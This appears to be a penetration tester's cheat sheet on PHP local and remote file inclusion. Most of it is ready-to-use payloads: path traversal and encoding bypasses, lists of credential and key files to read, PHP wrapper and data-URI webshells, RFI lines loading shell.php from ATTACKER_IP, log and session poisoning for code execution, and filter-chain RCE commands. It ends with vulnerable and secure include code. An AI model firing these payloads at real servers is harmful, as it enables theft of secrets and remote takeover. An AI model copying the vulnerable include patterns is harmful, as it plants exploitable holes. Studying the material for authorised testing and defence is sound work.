tactic: Initial Access

**Local File Inclusion (LFI)** — server loads a local file using user-controlled input. Even without code execution, attackers can read sensitive files, source code, and credentials.

**Remote File Inclusion (RFI)** — server fetches and executes a file from an attacker-controlled URL. Requires `allow_url_include = On` in PHP (disabled by default). Leads directly to RCE.

```
?cat=     ?dir=      ?action=   ?board=    ?date=
?detail=  ?file=     ?download= ?path=     ?folder=
?prefix=  ?include=  ?page=     ?inc=      ?locate=
?show=    ?doc=      ?site=     ?type=     ?view=
?content= ?document= ?layout=   ?mod=      ?conf=
```


## Injection Points

- URL query parameters (see list above)
- `page`, `template`, `lang`, `module` parameters in CMS systems
- Cookie values used to load templates
- HTTP headers parsed into file paths (`Accept-Language: ../../../../etc/passwd`)
- `PATH_INFO` on servers that process it
- Archive extraction paths (see [[File Upload]])

---

## Checklist

### Basic LFI Detection

- [ ]  Submit a path traversal to a known file:

```
	?page=../../../etc/passwd
	?file=../../../../etc/passwd
	?include=../../../etc/passwd
```

- [ ]  On Windows:

```
	?page=..\..\..\windows\win.ini
	?file=../../../windows/system32/drivers/etc/hosts
```

### LFI Bypass Techniques

**Nested traversal (strips `../` once but leaves `....//`):**

```
?page=....//....//....//etc/passwd
?page=....\/....\/....\/etc/passwd
```

**URL encoded traversal:**

```
?page=..%252f..%252f..%252fetc%252fpasswd
?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
?page=%252e%252e%252fetc%252fpasswd
```

**Null byte (terminates appended `.php` extension in old PHP):**

```
?page=../../../etc/passwd%00
?page=%252e%252e%252fetc%252fpasswd%00
```

**Folder prefix (server validates starting path):**

```
?page=utils/scripts/../../../../../etc/passwd
```

**Unicode / overlong encoding:**

```
?page=%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```

### Target Files to Read

**Linux:**

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/ssh/sshd_config
/proc/self/environ       ← may contain HTTP headers → inject here for RCE
/proc/self/cmdline
/proc/self/fd/0          ← stdin
/var/log/apache2/access.log   ← log poisoning for RCE
/var/log/nginx/access.log
/var/log/auth.log
/root/.ssh/id_rsa
/home/user/.ssh/id_rsa
/var/www/html/config.php
/var/www/html/.env
/etc/php.ini
/etc/php/7.4/apache2/php.ini
```

**Windows:**

```
\windows\win.ini
\windows\system32\drivers\etc\hosts
\inetpub\wwwroot\web.config
\xampp\apache\conf\httpd.conf
```

### PHP Wrappers

**Read file as base64 (bypasses filters, returns raw content):**

```
?file=php://filter/convert.base64-encode/resource=/etc/passwd
?file=php://filter/convert.base64-encode/resource=../config.php
```

**ROT13 filter:**

```
?file=php://filter/string.rot13/resource=/etc/passwd
```

**Compression filter:**

```
?file=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

**Chain filters (useful for bypassing content checks):**

```
?file=php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd
```

**PHP input — execute POST body as PHP (if `allow_url_include=On`):**

```http
POST /index.php?file=php://input HTTP/1.1

<?php system($_GET['cmd']); ?>
```

**Data URI — inline PHP execution:**

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

Decoded: `<?php system($_GET['cmd']); ?>`

**Expect wrapper — direct command execution (if enabled):**

```
?file=expect://id
?file=expect://whoami
```

### RFI (Remote File Inclusion)

- [ ]  Check if `allow_url_include = On` — try including a remote URL:

```
	?file=http://OASTIFY.COM/test.txt
```

```
If you get a DNS/HTTP hit → RFI confirmed
```

- [ ]  Host a PHP webshell on your server and include it:

```
	?file=http://ATTACKER_IP/shell.php&cmd=id
```

- [ ]  Try alternate protocols if HTTP is blocked:

```
	?file=ftp://ATTACKER_IP/shell.php
	?file=smb://ATTACKER_IP/share/shell.php
```

### LFI to RCE Techniques

**Log poisoning — inject PHP into a log file then include it:**

```
# Step 1: Inject PHP into User-Agent header (gets written to access.log)
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>

# Step 2: Include the log file
?file=/var/log/apache2/access.log&cmd=id
```

Other injectable log files:

```
/var/log/nginx/access.log
/var/log/auth.log          ← inject via SSH username: ssh '<?php system($_GET[0]); ?>'@target.com
/proc/self/environ         ← inject via User-Agent or other headers
/var/mail/www-data          ← inject via email if mail is processed
```

**PHP session file inclusion:**

```
# Step 1: Set a PHP session with a poisoned value
GET /index.php?page=test HTTP/1.1
Cookie: PHPSESSID=yourvalue

# Step 2: Include the session file (path varies)
?file=/var/lib/php/sessions/sess_yourvalue
?file=/tmp/sess_yourvalue
```

**PHP filter chain RCE (no file write needed — generate from gadget chain):**

bash

```bash
python php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'
```

Pass the generated chain as the `file` parameter — no `allow_url_include` needed.

---

## Attack Payloads

**Read /etc/passwd:**

```
?page=../../../etc/passwd
```

**Read source code as base64:**

```
?file=php://filter/convert.base64-encode/resource=index.php
```

**RFI with webshell:**

```
?file=http://ATTACKER_IP/shell.php&cmd=whoami
```

**Data URI webshell:**

```
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id
```

**Log poisoning — Apache:**

```
# Inject:
User-Agent: <?php system($_GET['c']); ?>
# Include:
?file=/var/log/apache2/access.log&c=id
```

**PHP filter chain RCE:**

bash

```bash
python php_filter_chain_generator.py --chain '<?=`$_GET[0]`; ?>' | tail -n 1
```

---

## White Box Testing

**Vulnerable, user input used directly in include/require:**

```php
// PHP — classic LFI
$file = $_GET["file"];
include($file);  // attacker: ?file=../../../../etc/passwd
```

```java
// Java equivalent — reading a file with unsanitized path
@GetMapping("/view")
public ResponseEntity<String> view(@RequestParam String page) throws IOException {
    // no validation — attacker traverses out of intended directory
    Path path = Paths.get("/var/www/templates/").resolve(page);
    String content = Files.readString(path);
    return ResponseEntity.ok(content);
}
```

**Vulnerable, extension appended but null byte bypasses it (old PHP):**

```php
$file = $_GET["page"];
include($file . ".php");
// attacker: ?page=../../../../etc/passwd%00  → null terminates before .php
```

**Vulnerable, RFI with allow_url_include enabled:**

```php
$module = $_GET["module"];
include $module;  // ?module=http://attacker.com/shell.php
```

**Secure:**

```java
// Whitelist allowed template names — never use user input as a path directly
private static final Set<String> ALLOWED_PAGES = Set.of("home", "about", "contact");

@GetMapping("/view")
public ResponseEntity<String> view(@RequestParam String page) throws IOException {
    if (!ALLOWED_PAGES.contains(page)) {
        return ResponseEntity.badRequest().body("Invalid page");
    }
    // construct path from validated name only
    Path path = Paths.get("/var/www/templates/").resolve(page + ".html").normalize();
    Path baseDir = Paths.get("/var/www/templates/").toRealPath();

    if (!path.toRealPath().startsWith(baseDir)) {
        return ResponseEntity.status(403).build();
    }
    return ResponseEntity.ok(Files.readString(path));
}
```

```php
// PHP secure — whitelist approach
$allowed = ['home', 'about', 'contact'];
$page = $_GET['page'];
if (!in_array($page, $allowed, true)) {
    die("Invalid page");
}
include("/var/www/templates/" . $page . ".php");

// Disable dangerous PHP settings in php.ini
// allow_url_include = Off
// allow_url_fopen = Off
```

---

## Resources

- [HackTricks LFI](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator)
- [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)